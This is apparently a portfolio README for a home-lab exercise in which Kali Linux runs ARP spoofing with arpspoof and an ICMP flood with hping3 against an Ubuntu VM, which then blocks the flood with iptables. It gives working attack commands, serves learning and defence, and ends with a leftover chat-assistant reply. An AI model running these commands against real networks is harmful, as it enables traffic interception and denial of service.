 **Simulating attacks** 

#  Simulating Attacks and Defending Against Them

##  Objective
The goal of this project was to simulate **network attacks** such as ARP spoofing and ping floods in a virtual environment using Kali Linux as the attacker and Ubuntu as the defender, and then analyze **detection** and **mitigation techniques**.

---

## Tools Used
- **VirtualBox or VMware** – virtualization software  
- **Kali Linux** – attacker machine ([Download](https://www.kali.org))  
- **Ubuntu** – defender machine ([Download](https://ubuntu.com))  
- **Dsniff** – installed on Kali Linux (for `arpspoof`)  
- **Wireshark** – installed on Ubuntu (for packet analysis)  
- **hping3** – used for aggressive flooding attacks  

---

## Project Setup
1. Install **Kali Linux** and **Ubuntu** on VirtualBox (or VMware).  
2. Configure both systems to be on the **same network** (NAT or Host-Only).  
   - Example IPs:  
     - Kali Linux (attacker): `192.168.1.10`  
     - Ubuntu (defender): `192.168.1.20`  
3. Verify connectivity between machines:  
   ```bash
   ping 192.168.1.20   # from attacker to victim
   ping 192.168.1.10   # from victim to attacker
````

 Successful pings confirm communication.

![Ping Test](images/ping-test.png)

---

##  Simulating Attacks

### 1. Enable IP Forwarding on Kali

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

Output `1` means IP forwarding is active.

![IP Forwarding](images/ip-forwarding.png)

---

### 2. Install and Use Dsniff (ARP Spoofing)

```bash
sudo apt update
sudo apt install dsniff
sudo arpspoof -i eth0 -t 192.168.1.20 192.168.1.1
```

This tricks the victim into sending traffic meant for the gateway (`192.168.1.1`) to the attacker.

![ARP Spoofing](images/arpspoof.png)

---

### 3. Install and Use hping3 (Ping Flood Attack)

```bash
sudo apt install hping3
sudo hping3 -1 --flood -p 80 192.168.1.20
```

This sends an aggressive flood of ICMP packets to the victim system.

![Flood Attack](images/hping3.png)

---

##  Defending Against the Attack

On the Ubuntu defender system, use **iptables** to block the attacker:

```bash
sudo iptables -A INPUT -s 192.168.1.10 -p icmp -j DROP
sudo iptables -L
```

 This prevents ICMP packets from the attacker, stopping the flood.

![Defense](images/iptables-defense.png)

---

##  Analysis

* The victim system stopped responding to ICMP packets after the firewall rule was applied.
* The attacker continued sending requests, but no replies were received.
* Wireshark confirmed that packets were being dropped.

---

##  Conclusion

This project demonstrated a **Man-in-the-Middle (MITM) attack** using ARP spoofing and a **ping flood (DoS attack)**, along with defensive measures using `iptables`.

### Key Takeaways:

* ARP spoofing can redirect traffic from victims to attackers.
* Flooding attacks can overwhelm systems with packets.
* Simple firewall rules can mitigate such threats.

### Best Practices to Prevent Attacks:

* Always use **encrypted connections (HTTPS)**.
* Use a **VPN** when connecting to public Wi-Fi.
* Deploy **intrusion detection systems (IDS/IPS)** to monitor unusual traffic.

---

Would you like me to also create a **short "What I Learnt" section** like the Wazuh project, so both READMEs are consistent for your GitHub portfolio?
```
